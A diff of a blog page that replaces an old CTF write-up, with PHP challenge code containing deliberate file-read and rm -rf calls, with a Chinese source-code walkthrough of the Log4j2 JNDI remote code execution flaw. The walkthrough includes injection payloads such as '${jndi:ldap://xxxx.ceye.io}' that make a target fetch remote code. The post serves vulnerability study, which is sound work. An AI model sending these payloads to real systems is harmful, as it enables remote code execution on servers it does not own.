@@ -4,14 +4,9 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="DASCTF X GFCTF wp, Ethe&#39;s blog">
-    <meta name="description" content="hade_waibo非预期就是先读start.sh文件，找到flag位置后读flag文件
-预期解
-#index.php
-&amp;lt;?php
-error_reporting(0);
-session_start();
-include &amp;#39;c">
+    <meta name="keywords" content="log4j2漏洞, Ethe&#39;s blog">
+    <meta name="description" content="看面经和复习期末考试都怪无聊的，看点这个核弹级漏洞
+背景2021年11月24日，阿里云安全团队向Apache官方报告了Apache Log4j2远程代码执行漏洞。由于Apache Log4j2某些功能存在递归解析功能，攻击者可直接构造恶意请">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -23,7 +18,7 @@ include &amp;#39;c">
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>DASCTF X GFCTF wp | Ethe&#39;s blog</title>
+    <title>log4j2漏洞 | Ethe&#39;s blog</title>
     <link rel="icon" type="image/png" href="https://epicture.oss-cn-beijing.aliyuncs.com/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -327,12 +322,12 @@ include &amp;#39;c">
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://epicture.oss-cn-beijing.aliyuncs.com/medias/featureimages/21.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://epicture.oss-cn-beijing.aliyuncs.com/medias/featureimages/0.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">DASCTF X GFCTF wp</h1>
+                    <h1 class="description center-align post-title">log4j2漏洞</h1>
                 </div>
             </div>
         </div>
@@ -460,9 +455,17 @@ include &amp;#39;c">
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                          <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
-                          </div>
+                    <div class="article-tag">
+                        
+                            <a href="/tags/web%E5%AD%A6%E4%B9%A0/">
+                                <span class="chip bg-color">web学习</span>
+                            </a>
+                        
+                            <a href="/tags/Java/">
+                                <span class="chip bg-color">Java</span>
+                            </a>
+                        
+                    </div>
                     
                 </div>
                 <div class="col s5 right-align">
@@ -474,28 +477,28 @@ include &amp;#39;c">
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2022-11-11
+                    2023-06-04
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2023-02-07
+                    2023-06-06
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    721
+                    3.7k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    4 分
+                    14 分
                 </div>
                 
 
@@ -518,146 +521,391 @@ include &amp;#39;c">
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="hade-waibo"><a href="#hade-waibo" class="headerlink" title="hade_waibo"></a>hade_waibo</h2><p>非预期就是先读start.sh文件，找到flag位置后读flag文件</p>
-<p><strong>预期解</strong></p>
-<pre class="language-php" data-language="php"><code class="language-php">#index.php
-&lt;?php
-error_reporting(0);
-session_start();
-include &#39;class.php&#39;;
+                <p>看面经和复习期末考试都怪无聊的，看点这个核弹级漏洞</p>
+<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>2021年11月24日，阿里云安全团队向Apache官方报告了Apache Log4j2远程代码执行漏洞。由于Apache Log4j2某些功能存在递归解析功能，攻击者可直接构造恶意请求，触发远程代码执行漏洞。漏洞利用无需特殊配置，经阿里云安全团队验证，Apache Struts2、Apache Solr、Apache Druid、Apache Flink等均受影响。阿里云应急响应中心提醒 Apache Log4j2 用户尽快采取安全措施阻止漏洞攻击。</p>
+<p>log4j2远程代码执行漏洞主要由于存在JNDI注入漏洞，黑客可以恶意构造特殊数据请求包，触发此漏洞，从而成功利用此漏洞可以在目标服务器上执行任意代码。</p>
+<p>（阿里好像还因为没先跟cnvd说所以被罚了</p>
+<h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><h2 id="Log4j2"><a href="#Log4j2" class="headerlink" title="Log4j2"></a>Log4j2</h2><p>Apache Log4j 2是对Log4j的升级，它比其前身Log4j 1.x提供了重大改进，并提供了Logback中可用的许多改进，同时修复了Logback架构中的一些问题。是目前最优秀的Java日志框架之一。</p>
+<p>本次漏洞影响范围为Log4j2最早期的版本2.0-beta9到2.14.1。</p>
+<p>由于Log4j2重新构建和设计了框架，所以可以认为两者是完全独立的两个日志组件。但是他们的包还是很相似，这里给出一点差异</p>
+<p>Log4j2分为2个jar包，一个是接口log4j-api-${版本号}.jar，一个是具体实现log4j-core-${版本号}.jar。Log4j只有一个jar包log4j-${版本号}.jar。<br>Log4j2的版本号目前均为2.x。Log4j的版本号均为1.x。<br>Log4j2的package名称前缀为org.apache.logging.log4j。Log4j的package名称前缀为org.apache.log4j。</p>
+<p>具体的发展过程可以看看这个<a target="_blank" rel="noopener" href="https://paper.seebug.org/1789/%E7%9A%84Java%E6%97%A5%E5%BF%97%E4%BD%93%E7%B3%BB%E9%83%A8%E5%88%86">https://paper.seebug.org/1789/的Java日志体系部分</a></p>
+<h2 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h2><p>java命名和目录接口</p>
+<p><strong>它就像一个映射关系库，里面有很多资源，每个资源对应一个名字，当我查看这个名字时候，就会提供对应资源。将资源和名字进行了一对一映射。一些基本操作，发布服务bind(),查找服务lookup()。</strong></p>
+<h2 id="LDAP协议"><a href="#LDAP协议" class="headerlink" title="LDAP协议"></a>LDAP协议</h2><p> 轻型目录访问协议</p>
+<p>LDAP可以理解是一个简单存储数据的数据库，不过它是树状结构的，树形结构存储数据，查询效率更高。</p>
+<h2 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h2><p>第一个是由于JNDI的动态协议转换，即使初始化的context指定了协议，也会根据URL传入的参数来转换协议。</p>
+<p>其实就是说即使提前配置了Context.PROVIDER_URL属性，当我们调用lookup()方法时，如果lookup方法的参数是一个url地址，那么客户端就会去lookup()方法参数指定的uri中加载远程对象，而不是去Context.PROVIDER_URL设置的地址去加载对象。</p>
+<p>正是因为有这个特性，才导致当lookup()方法的参数可控时，攻击者可以通过提供一个恶意的url地址来控制受害者加载攻击者指定的恶意类。</p>
+<p>第二个是由于JNDI Naming Reference，Reference类表示对存在于命名/目录系统以外的对象的引用。如果远程获取 LDAP 服务上的对象为 Reference 类或者其子类，则在客户端获取到远程对象存根实例时，可以从其他服务器上加载 class 文件来进行实例化。</p>
+<p>其实可以简单理解为我这LDAP存储空间有限，我把多余的数据放在我的一个web网站里面，可以通过url地址进行引用，查询的数据如果我自己数据库里面没有，我就会自动去我这个指定的地址在web网站查找指定资源。</p>
+<p>（这里jndi注入那篇写的有点赶，所以就没怎么细说原理，就在这里补上了</p>
+<h1 id="Log4j2源码浅析"><a href="#Log4j2源码浅析" class="headerlink" title="Log4j2源码浅析"></a>Log4j2源码浅析</h1><p>然后简单分析一下源码</p>
+<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>先引入依赖</p>
+<pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependencies</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.apache.logging.log4j<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>log4j-core<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>2.14.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependencies</span><span class="token punctuation">></span></span></code></pre>
 
-if(isset($_POST[&#39;username&#39;]) &amp;&amp; $_POST[&#39;username&#39;]!&#x3D;&#39;&#39;)&#123;
-	#修复了登录还需要passwd的漏洞
-	$user &#x3D; new User($_POST[&#39;username&#39;]);
-&#125;
+<p>在工程目录resources下创建log4j2.xml</p>
+<pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span>
 
-if($_SESSION[&#39;isLogin&#39;])&#123;
-	die(&quot;&lt;script&gt;alert(&#39;Login success!&#39;);location.href&#x3D;&#39;file.php&#39;&lt;&#x2F;script&gt;&quot;);
-&#125;else&#123;
-	die(&#39;
-&lt;form action&#x3D;&quot;index.php&quot; method&#x3D;&quot;post&quot;&gt;
-	&lt;div class&#x3D;&quot;ui input&quot;&gt;
-		&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;username&quot; placeholder&#x3D;&quot;Give me uname&quot; maxlength&#x3D;&quot;6&quot;&gt;
-	&lt;&#x2F;div&gt;
-&lt;form&gt;&#39;);
-&#125;</code></pre>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>configuration</span> <span class="token attr-name">status</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>error<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>appenders</span><span class="token punctuation">></span></span>
+<span class="token comment">&lt;!--        配置Appenders输出源为Console和输出语句SYSTEM_OUT--></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Console</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Console<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>SYSTEM_OUT<span class="token punctuation">"</span></span> <span class="token punctuation">></span></span>
+<span class="token comment">&lt;!--            配置Console的模式布局--></span>
+            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PatternLayout</span> <span class="token attr-name">pattern</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; [%t] %level %logger&#123;36&#125; - %msg%n<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Console</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>appenders</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>loggers</span><span class="token punctuation">></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span> <span class="token attr-name">level</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>error<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>appender-ref</span> <span class="token attr-name">ref</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Console<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>loggers</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>configuration</span><span class="token punctuation">></span></span></code></pre>
 
-<pre class="language-php" data-language="php"><code class="language-php">#class.php
-&lt;?php
-class User
-&#123;
-    public $username;
-    public function __construct($username)&#123;
-        $this-&gt;username &#x3D; $username;
-        $_SESSION[&#39;isLogin&#39;] &#x3D; True;
-        $_SESSION[&#39;username&#39;] &#x3D; $username;
-    &#125;
-    public function __wakeup()&#123;
-        $cklen &#x3D; strlen($_SESSION[&quot;username&quot;]);
-        if ($cklen !&#x3D; 0 and $cklen &lt;&#x3D; 6) &#123;
-            $this-&gt;username &#x3D; $_SESSION[&quot;username&quot;];
-        &#125;
-    &#125;
-    public function __destruct()&#123;
-        if ($this-&gt;username &#x3D;&#x3D; &#39;&#39;) &#123;
-            session_destroy();
-        &#125;
-    &#125;
-&#125;
+<p>log4j2中包含两个关键组件<code>LogManager</code>和<code>LoggerContext</code>。<code>LogManager</code>是Log4J2启动的入口，可以初始化对应的<code>LoggerContext</code>。<code>LoggerContext</code>会对配置文件进行解析等其它操作。</p>
+<p>在不使用slf4j的情况下常见的Log4J用法是从LogManager中获取Logger接口的一个实例，并调用该接口上的方法。运行下列代码查看打印结果</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230604145321617.png" alt="image-20230604145321617"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230604145339868.png" alt="image-20230604145339868"></p>
+<h2 id="属性占位符之Interpolator插值器"><a href="#属性占位符之Interpolator插值器" class="headerlink" title="属性占位符之Interpolator插值器"></a>属性占位符之Interpolator插值器</h2><p>log4j2中环境变量键值对被封装为了StrLookup对象。这些变量的值可以通过属性占位符来引用，格式为:<code>$&#123;prefix:key&#125;</code>。在Interpolator插值器内部以Map的方式则封装了多个StrLookup对象，如下图显示：</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230604150135457.png" alt="image-20230604150135457"></p>
+<p>简单说就是通过${prefix:key}这种方式可以调用这里面存的环境变量</p>
+<p>然后在输出错误信息的时候</p>
+<p>会进行一个检测</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230604150546298.png" alt="image-20230604150546298"></p>
+<p>先找strLookupMap里有没有这个prefix</p>
+<p>比如这里这个prefix就是java</p>
+<p>然后就会去调用对应的lookup方法</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230604151107758.png" alt="image-20230604151107758"></p>
+<p>假如我把java改成marker</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230604151221638.png" alt="image-20230604151221638"></p>
+<p>那再假如这里不是marker，而是jndi，那调用的就会是jndi的lookup，就有可能会造成jndi的注入</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230604151534344.png" alt="image-20230604151534344"></p>
+<p>这里虽然是JndiLookup，但是看名字最后调用的应该就是jndi的lookup，先不往下跟了，之后再说</p>
+<h2 id="模式布局"><a href="#模式布局" class="headerlink" title="模式布局"></a>模式布局</h2><p>log4j2支持通过配置Layout打印格式化的指定形式日志，可以在Appenders的后面附加Layouts来完成这个功能。常用之一有<code>PatternLayout</code>，也就是我们在配置文件中<code>PatternLayout</code>字段所指定的属性<code>pattern</code>的值<code>%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; [%t] %level %logger&#123;36&#125; - %msg%n</code>。 <code>%msg</code>表示所输出的消息</p>
+<p><code>PatternLayout</code>模式布局会通过PatternProcessor模式解析器，对模式字符串进行解析，得到一个<code>List&lt;PatternConverter&gt;</code>转换器列表和<code>List&lt;FormattingInfo&gt;</code>格式信息列表。在配置文件<code>PatternLayout</code>标签的<code>pattern</code>属性中我们可以看到类似%d的写法，d代表一个转换器名称，log4j2会通过<code>PluginManager</code>收集所有类别为Converter的插件,同时分析插件类上的@ConverterKeys注解,获取转换器名称,并建立名称到插件实例的映射关系，当PatternParser识别到转换器名称的时候,会查找映射。</p>
+<table>
+<thead>
+<tr>
+<th>序号</th>
+<th>名称</th>
+<th>类型</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>d date</td>
+<td>DatePatternConverter</td>
+<td>日志的时间戳</td>
+</tr>
+<tr>
+<td>2</td>
+<td>p level</td>
+<td>LevelPatternConverter</td>
+<td>日志级别</td>
+</tr>
+<tr>
+<td>3</td>
+<td>m msg message</td>
+<td>MessagePatternConverter</td>
+<td>日志中的消息内容</td>
+</tr>
+<tr>
+<td>4</td>
+<td>C class</td>
+<td>ClassNamePatternConverter</td>
+<td>日志打印点所在类的类名 <strong>注意:需要给LoggerincludeLocation=&quot;true&quot;属性开启位置</strong></td>
+</tr>
+<tr>
+<td>5</td>
+<td>M method</td>
+<td>MethodLocationPatternConverter</td>
+<td>日志打印点所在方法的方法名 <strong>注意:需要给LoggerincludeLocation=&quot;true&quot;属性开启位置</strong></td>
+</tr>
+<tr>
+<td>6</td>
+<td>c logger</td>
+<td>LoggerPatternConverter</td>
+<td>Logger实例的名称</td>
+</tr>
+<tr>
+<td>7</td>
+<td>n</td>
+<td>LineSeparatorPatternConverter</td>
+<td>专门追加换行符</td>
+</tr>
+<tr>
+<td>8</td>
+<td>properties</td>
+<td>Log4j1MdcPatternConverter</td>
+<td></td>
+</tr>
+<tr>
+<td>9</td>
+<td>ndc</td>
+<td>Log4j1NdcPatternConverter</td>
+<td></td>
+</tr>
+<tr>
+<td>10</td>
+<td>enc encode</td>
+<td>EncodingPatternConverter</td>
+<td></td>
+</tr>
+<tr>
+<td>11</td>
+<td>equalsIgnoreCase</td>
+<td>EqualsIgnoreCaseReplacementConverter</td>
+<td></td>
+</tr>
+<tr>
+<td>12</td>
+<td>equals</td>
+<td>EqualsReplacementConverter</td>
+<td></td>
+</tr>
+<tr>
+<td>13</td>
+<td>xEx xThroable xException</td>
+<td>ExtendedThrowablePatternConverter</td>
+<td></td>
+</tr>
+<tr>
+<td>14</td>
+<td>F file</td>
+<td>FileLocationPatternConverter</td>
+<td><strong>注意:需要给LoggerincludeLocation=&quot;true&quot;属性开启位置</strong></td>
+</tr>
+<tr>
+<td>15</td>
+<td>l location</td>
+<td>FullLocationPatternConverter</td>
+<td>相当于%C.%M(%F:%L) <strong>注意:需要给LoggerincludeLocation=&quot;true&quot;属性开启位置</strong></td>
+</tr>
+<tr>
+<td>16</td>
+<td>highlight</td>
+<td>HighlightConverter</td>
+<td></td>
+</tr>
+<tr>
+<td>17</td>
+<td>L line</td>
+<td>LineLocationPatternConverter</td>
+<td>日志打印点的代码行数 <strong>注意:需要给LoggerincludeLocation=&quot;true&quot;属性开启位置</strong></td>
+</tr>
+<tr>
+<td>18</td>
+<td>K map MAP</td>
+<td>MapPatternConverter</td>
+<td></td>
+</tr>
+<tr>
+<td>19</td>
+<td>marker</td>
+<td>MarkerPatternConverter</td>
+<td>打印完整标记,格式如:标记名[父标记名[祖父标记名]],一个标记可以有多个父标记</td>
+</tr>
+<tr>
+<td>20</td>
+<td>markerSimpleName</td>
+<td>MarkerSimpleNamePatternConverter</td>
+<td>只打印标记的名称</td>
+</tr>
+<tr>
+<td>21</td>
+<td>maxLength maxLen</td>
+<td>MaxLengthConverter</td>
+<td></td>
+</tr>
+<tr>
+<td>22</td>
+<td>X mdc MDC</td>
+<td>MdcPatternConverter</td>
+<td><code>LogEvent.getContextData()</code>映射诊断上下文</td>
+</tr>
+<tr>
+<td>23</td>
+<td>N nano</td>
+<td>NanoTimePatternConverter</td>
+<td></td>
+</tr>
+<tr>
+<td>24</td>
+<td>x NDC</td>
+<td>NdcPatternConverter</td>
+<td><code>LogEvent.getContextStack()</code>嵌套诊断上下文</td>
+</tr>
+<tr>
+<td>25</td>
+<td>replace</td>
+<td>RegexReplacementConverter</td>
+<td></td>
+</tr>
+<tr>
+<td>26</td>
+<td>r relative</td>
+<td>RelativeTimePatternConverter</td>
+<td></td>
+</tr>
+<tr>
+<td>27</td>
+<td>rEx rThrowable rException</td>
+<td>RootThrowablePatternConverter</td>
+<td></td>
+</tr>
+<tr>
+<td>28</td>
+<td>style</td>
+<td>StyleConverter</td>
+<td></td>
+</tr>
+<tr>
+<td>29</td>
+<td>T tid threadId</td>
+<td>ThreadIdPatternConverter</td>
+<td>线程id</td>
+</tr>
+<tr>
+<td>30</td>
+<td>t tn thread threadName</td>
+<td>ThreadNamePatternConverter</td>
+<td>线程名称</td>
+</tr>
+<tr>
+<td>31</td>
+<td>tp threadPriority</td>
+<td>ThreadPriorityPatternConverter</td>
+<td>线程优先级</td>
+</tr>
+<tr>
+<td>32</td>
+<td>ex throwable Exception</td>
+<td>ThrowablePatternConverter</td>
+<td>异常</td>
+</tr>
+<tr>
+<td>33</td>
+<td>u uuid</td>
+<td>UuidPatternConverter</td>
+<td>生成一个uuid,随日志一起打印,用于唯一标识一条日志</td>
+</tr>
+<tr>
+<td>34</td>
+<td>notEmpty varsNotEmpty variablesNotEmpty</td>
+<td>VariablesNotEmptyReplacementConverter</td>
+<td></td>
+</tr>
+</tbody></table>
+<p>简单说就是如果配置文件里写的是%msg这种，就去找MessagePatternConverter进行处理</p>
+<p>这个MessagePatternConverter也是log4j漏洞产生的一个重要原因</p>
+<h2 id="日志级别"><a href="#日志级别" class="headerlink" title="日志级别"></a>日志级别</h2><p>log4j2支持多种日志级别，通过日志级别我们可以将日志信息进行分类，在合适的地方输出对应的日志。哪些信息需要输出，哪些信息不需要输出，只需在一个日志输出控制文件中稍加修改即可。级别由高到低共分为6个：<code>fatal(致命的), error, warn, info, debug, trace(堆栈)。</code>  log4j2还定义了一个内置的标准级别<code>intLevel</code>，由数值表示，级别越高数值越小。</p>
+<p>当日志级别（调用）大于等于系统设置的<code>intLevel</code>的时候，log4j2才会启用日志打印。在存在配置文件的时候 ，会读取配置文件中<code>&lt;root level=&quot;error&quot;&gt;</code>值设置<code>intLevel</code>。当然我们也可以通过<code>Configurator.setLevel(&quot;当前类名&quot;, Level.INFO);</code>来手动设置。</p>
+<p>如果没有配置文件也没有指定则会默认使用Error级别，也就是200</p>
+<h1 id="漏洞细节"><a href="#漏洞细节" class="headerlink" title="漏洞细节"></a>漏洞细节</h1><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>网上最常见的就是dnslog的payload</p>
+<pre class="language-java" data-language="java"><code class="language-java">$&#123;jndi:ldap:&#x2F;&#x2F;xxxx.ceye.io&#125;</code></pre>
 
-class File
-&#123;
-    #更新黑名单为白名单，更加的安全
-    public $white &#x3D; array(&quot;jpg&quot;,&quot;png&quot;);
+<p>其实就是调用jndi的lookup，然后url就是dns://xxxx.ceye.io。让被攻击侧往这个url上发起dns请求</p>
+<p>这里我就直接用ldap弹计算器了</p>
+<p>首先是开启一个本地的ldap服务端，然后python在恶意字节码目录下起个服务</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230604163412225.png" alt="image-20230604163412225"></p>
+<p>跟一下流程</p>
+<p>把断点下在<code>org/apache/logging/log4j/core/appender/AbstractOutputStreamAppender.java</code>中的<code>directEncodeEvent</code>方法上</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230604163717093.png" alt="image-20230604163717093"></p>
+<p>这里会获取当前使用的布局，然后调用对应的encode方法</p>
+<p>默认的话就是PatternLayout</p>
+<p>所以就会调用PatternLayout的encode方法</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230604163829932.png" alt="image-20230604163829932"></p>
+<p>这里面有个toText方法</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230604163928931.png" alt="image-20230604163928931"></p>
+<p>接着进入toSerializable</p>
+<p>这里边就会调用不同的Converter来处理传入的数据</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230604164138244.png" alt="image-20230604164138244"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230604164227823.png" alt="image-20230604164227823"></p>
+<p>这里我们只跟MessagePatternConverter  </p>
+<p>在MessagePatternConverter 的format里，对字符串进行了处理</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230604164448382.png" alt="image-20230604164448382"></p>
+<p>最主要的就是这个if里</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230604165229803.png" alt="image-20230604165229803"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230604165308270.png" alt="image-20230604165308270"></p>
+<p>可以看到第二行重设了workingBuilder这个StringBuilder对象的长度，把原本的83改成了50</p>
+<p>这个50就是在输出的这行日志中出现$字符的位置</p>
+<p>也就是说把${jndi:ldap://127.0.0.1:9999/exp}单独切了出来，不在workingBuilder里了</p>
+<p>然后最后一行又进行了一个append操作，加入的内容是config.getStrSubstitutor().replace(event, value)</p>
+<p>这里又是个替换</p>
+<blockquote>
+<p>使用 Apache Commons Configuration 库中的 <code>StrSubstitutor</code> 对象来替换字符串中的占位符。</p>
+<p><code>StrSubstitutor</code> 是一个用于替换字符串中的变量的工具类。它可以根据提供的键值对，将字符串中的占位符替换为对应的值。通常情况下，占位符使用 <code>$&#123;&#125;</code> 或者 <code>$()</code> 包围。</p>
+</blockquote>
+<p>value就是我们之前切出来的${jndi:ldap://127.0.0.1:9999/exp}</p>
+<p>继续跟进会到Interpolator.lookup</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230604170321668.png" alt="image-20230604170321668"></p>
+<p>这里就是之前说的插值器的地方</p>
+<p>先根据var.indexOf(<em>PREFIX_SEPARATOR</em>);判断&quot;:&quot;之前的字符</p>
+<p>再通过</p>
+<pre class="language-java" data-language="java"><code class="language-java">final String prefix &#x3D; var.substring(0, prefixPos).toLowerCase(Locale.US);
+final String name &#x3D; var.substring(prefixPos + 1);</code></pre>
 
-    public function show($filename)&#123;
-        echo &#39;&lt;div class&#x3D;&quot;ui action input&quot;&gt;&lt;input type&#x3D;&quot;text&quot; id&#x3D;&quot;filename&quot; placeholder&#x3D;&quot;Search...&quot;&gt;&lt;button class&#x3D;&quot;ui button&quot; onclick&#x3D;&quot;window.location.href&#x3D;\&#39;file.php?m&#x3D;show&amp;filename&#x3D;\&#39;+document.getElementById(\&#39;filename\&#39;).value&quot;&gt;Search&lt;&#x2F;button&gt;&lt;&#x2F;div&gt;&lt;p&gt;&#39;;
-        if(empty($filename))&#123;die();&#125;
-        return &#39;&lt;img src&#x3D;&quot;data:image&#x2F;png;base64,&#39;.base64_encode(file_get_contents($filename)).&#39;&quot; &#x2F;&gt;&#39;;
-    &#125;
-    public function upload($type)&#123;
-        $filename &#x3D; &quot;dasctf&quot;.md5(time().$_FILES[&quot;file&quot;][&quot;name&quot;]).&quot;.$type&quot;;
-        move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], &quot;upload&#x2F;&quot; . $filename);
-        return &quot;Upload success! Path: upload&#x2F;&quot; . $filename;
-    &#125;
-    public function rmfile()&#123;
-        system(&#39;rm -rf &#x2F;var&#x2F;www&#x2F;html&#x2F;upload&#x2F;*&#39;);
-    &#125;
-    public function check($type)&#123;
-        if (!in_array($type,$this-&gt;white))&#123;
-            return false;
-        &#125;
-        return true;
-    &#125;
+<p>把第一个:前后的东西分离</p>
+<p>然后因为我们这里是jndi，所以这里的lookup就是JndiLookup</p>
+<p>很自然就进JndiLookup的lookup方法里了</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230604170942269.png" alt="image-20230604170942269"></p>
+<p>继续进jndiManager.lookup</p>
+<p>这个jndiName就是我们写的恶意ldap的url了</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230604171109684.png" alt="image-20230604171109684"></p>
+<p>现在到了InitialContext的lookup里了</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230604171437462.png" alt="image-20230604171437462"></p>
+<p>后边就纯ldap的jndi的路了</p>
+<p>恶意url也传进去了</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230604171604286.png" alt="image-20230604171604286"></p>
+<p>到这里漏洞流程就结束了，但是还有一点问题</p>
+<p>比如在源码解析里的日志级别好像并没有提到</p>
+<p>日志级别也是影响是否能实现log4j2漏洞的一个因素</p>
+<p>原因就是不管输出哪个级别的日志，都要调用这一个方法</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230604172239250.png" alt="image-20230604172239250"></p>
+<p>logIfEnabled方法用来判断日志优先级</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230604172342240.png" alt="image-20230604172342240"></p>
+<p>由于默认情况下是error，所以小于error的warn, info, debug, trace都不会满足这个判断，直接就返回了，不能接着往下走，也就不会触发漏洞了</p>
+<p>可以在配置文件里自行设置优先级</p>
